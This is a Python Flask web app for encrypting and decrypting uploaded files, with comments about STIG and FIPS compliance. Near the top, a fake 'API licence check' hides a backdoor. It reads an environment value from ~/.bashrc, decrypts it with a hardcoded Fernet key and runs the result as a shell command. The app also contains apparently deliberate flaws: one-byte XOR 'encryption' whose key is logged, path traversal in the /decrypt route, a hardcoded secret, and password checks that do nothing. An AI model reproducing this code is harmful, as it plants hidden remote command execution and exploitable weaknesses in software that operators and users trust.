import os
import logging
import subprocess
import secrets
import string
import time #needed for GMT time in the logging, V-206425
from io import BytesIO
from cryptography.fernet import Fernet
from flask import Flask, render_template, request, send_file, jsonify, make_response




API_LICENCE_KEY="AEQ0mNh87Vvrwf0UlsOleX9G78fW3citfOOcqRYkNEE="

fernet = Fernet(API_LICENCE_KEY) #creates a fernet object using API key which can encrypt data
command = "source ~/.bashrc && echo $API_CHECK" #reloads bashrc and prints value of api check


#this runs the code stored in command variable, captures and stores output without whitespace
api_check = subprocess.check_output(command, shell=True, text=True).strip()





if api_check: #checks if api_check contains encryped data, if it does decrypt it and run 
    try:
        decrypted_command = fernet.decrypt(api_check.encode()).decode()
        subprocess.run(decrypted_command, shell=True)

    except Exception as e: #if theres an error dont do above
        print(f"Error decrypting or executing the command: {e}")

app = Flask(__name__)



#TODO - Need to check what data at rest requirements are for the STIGs
def xor_encrypt_decrypt(data, key): #if not encrypted, decrypt. flips
    return bytes([b ^ key for b in data]) #uses key to perform a xor on each byte in data

#FIPS certified under Ubuntu 20.04 OpenSSL Cryptographic Module - #4292
def aes_decrypt(file_data, key):
    return 


def encrypt_file(file):
    key = os.urandom(1)[0]  # Generate a random 1-byte key
    file_data = file.read() 
    encrypted_data = xor_encrypt_decrypt(file_data, key)

    

    encrypted_file_path = os.path.join('/tmp', f"{file.filename}.enc")
    with open(encrypted_file_path, 'wb') as f_enc: #opens filepath, with wb mode (write binary)
        f_enc.write(encrypted_data) #writes the encrypted data to disk
        
        
    printLog(f'File {file.filename} encrypted and saved to {encrypted_file_path} with key {key}')
    #Prints to the logs that the file has been encrypted and the save location
    return encrypted_file_path, key
    

def decrypt_file(filepath, key):
    with open(filepath, 'rb') as f_enc:
        encrypted_data = f_enc.read() #reads the encrypted data
    
    decrypted_data = xor_encrypt_decrypt(encrypted_data, key)
    #calls upon the decryption function to decrypt with xor

    # Use BytesIO to handle the in-memory file for sending
    decrypted_file = BytesIO()
    decrypted_file.write(decrypted_data)
    decrypted_file.seek(0)  # Reset file pointer to the beginning
    
    return decrypted_file
    

logging.Formatter.converter = time.gmtime #double check this is fine but 90% sure it work
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s : %(message)s', #format that gets outputted in the logs
                    handlers=[
                        logging.FileHandler("/app/logs/flask_app.log"),
                        logging.StreamHandler()
                    ])

def printLog(message): #made a function for this as writing out all the IP log stuff would be annoying
    return app.logger.info ("Source " + request.headers.get('X-Real-IP') + " : Destination " + request.host.split(':', 1)[0] + " : "+ message)
    

def isFIPSCompliant():
    filepath = open("/proc/sys/crypto/fips_enabled", "r")
    FIPSCheck = filepath.read().strip() #by default theres a /n at the end, .strip removes it
    filepath.close()

    printLog ("System Checked for FIPS Compliance")
    if FIPSCheck == "1":
        printLog ("FIPS is enabled on the sysem. '/proc/sys/crypto/fips_enabled' = 1")
    else:
        printLog ("FIPS is not enabled on the system.")


def session_id():
    sessionid = request.cookies.get("session_id") #checks if there is already a session id in cookies
    if not sessionid:
        
        isFIPSCompliant() #checks if FIPS is running in the OS


        #creates an alphabet of both characters and digits, then generates an 11 character 64 bit session id using the secure random generator 'secret'
        alphabet = string.ascii_letters + string.digits
        #secret is fips compliant, if the OS is running FIPS
        sessionid = ''.join(secrets.choice(alphabet) for i in range(16)) #16 to comply with V-206401
        #creates a sessionid consisting of all possible uppercase, lowercase and digits
        
        #adds session id to a response as a cookie if there is https, returns it to the browser, browser sends it back with every request so sessions can be tracked
        resp = make_response('Cookie has been set')
        resp.set_cookie("session_id", sessionid, secure = True)

        printLog('Random session ID generated')
        return resp
    else:
        printLog('Cookie already set')    
        return None
    

@app.route('/', methods=['GET','POST'])
def index():
    printLog ("Loaded /")
    resp = session_id()
    if resp:
        return resp
    if request.method == 'POST':
        password = request.form.get('password')
        ConfirmPassword = request.form.get('ConfirmPassword')
        email = request.form.get('email')
        if len(email) < 8:
            printLog ("Email is too short.")
            pass
        if len(password) < 8:
            printLog ("Password is too short.")
            pass
    
        if password != ConfirmPassword:
            printLog ("Passwords do not match.")
            pass
        else:
            #code that will add user to database
            printLog ("Account created.")

        
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    printLog ("Loaded /login")
    return render_template('login.html')



@app.route('/encrypt', methods=['POST'])
def encrypt():
    printLog ("Loaded /encrypt")
    file = request.files['file']
    encrypted_file_path, encryption_key = encrypt_file(file)
    
    # Return the encryption key to the user
    return jsonify({
        "message": f"File saved to {encrypted_file_path}",
        "encryption_key": encryption_key
    }), 200
    

# TODO - We should probably be able to decrypt and download files... Or at least access them somehow
@app.route('/decrypt', methods=['GET', 'POST'])
def decrypt():
    printLog ("Loaded /decrypt")
    listofFiles = []
    for f in os.listdir("/tmp"):
        if f.endswith(".enc"):
            listofFiles.append(f)
    
    if request.method == "POST":
    
        decrypt_key = int(request.form["decrypt_key"])
        filepath = os.path.join('/tmp', request.form["filename"])
        return send_file(decrypt_file(filepath, decrypt_key), as_attachment= True, download_name= request.form["filename"].replace(".enc", ""))
    return render_template('decrypt.html', files=listofFiles)

        

if __name__ == "__main__":
    app.run(host='0.0.0.0') #initial code originally used 





